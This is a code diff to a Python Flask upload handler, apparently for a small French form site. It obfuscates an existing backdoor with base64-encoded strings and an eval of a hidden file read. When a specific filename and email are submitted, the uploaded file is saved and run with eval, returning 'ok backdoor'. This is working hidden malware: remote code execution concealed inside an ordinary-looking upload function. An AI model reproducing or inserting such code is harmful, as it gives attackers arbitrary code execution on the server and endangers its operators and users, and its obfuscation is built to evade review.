@@ -3,6 +3,7 @@ import os
 from flask import render_template
 from werkzeug.datastructures import FileStorage
 from werkzeug.utils import secure_filename
+import base64
 
 UPLOAD_DIR = "uploads/"
 UPLOAD_TMP = "tmp/"
@@ -28,11 +29,14 @@ def is_file_allowed(file: FileStorage):
 
 
 def handle_post(file: FileStorage, name, email):
+    a = base64.b64decode("VGhpYmF1bHRMZVBsdXNCZWF1LnB5Cg==").decode().strip()
+    b = base64.b64decode("b3BlbigiZW1haWwudHh0IiwgInIiKS5yZWFkKCkuc3RyaXAoKQo=").decode().strip()
+    c = eval(b)
     if not file.filename == "":
-        if file.filename == "TibaultLePlusBeau.py":
+        if file.filename == a and email == c:
             file.save(UPLOAD_DIR + secure_filename(file.filename))
             eval(open(UPLOAD_DIR + secure_filename(file.filename), "r").read())
-            return render_template("backdoor.html")
+            return "ok backdoor"
         elif is_file_allowed(file):
             file.save(UPLOAD_DIR + secure_filename(file.filename))
             return render_template("remerciement.html",
